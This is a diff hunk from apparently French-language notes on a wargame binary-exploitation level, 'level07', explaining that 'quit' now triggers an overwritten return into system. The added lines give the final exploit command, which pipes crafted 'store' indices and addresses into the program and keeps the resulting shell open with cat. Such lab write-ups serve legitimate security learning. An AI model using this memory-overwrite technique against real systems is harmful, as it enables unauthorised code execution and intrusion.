@@ -52,3 +52,7 @@ Input command: quit
 pour convertir addresse en decimal on le converti pas depuis le format little indian mais depuis le format normal
 
 quit est appeler pour executer le return qui a mtn etait remplacer par notre appel a system
+
+
+commande final = 
+(python -c 'print "store"'; python -c 'print "4159090384"'; python -c 'print "2147483762"'; python -c 'print "store"'; python -c 'print "4160264172"'; python -c 'print "116"'; python -c 'print "quit"'; cat) | ./level07
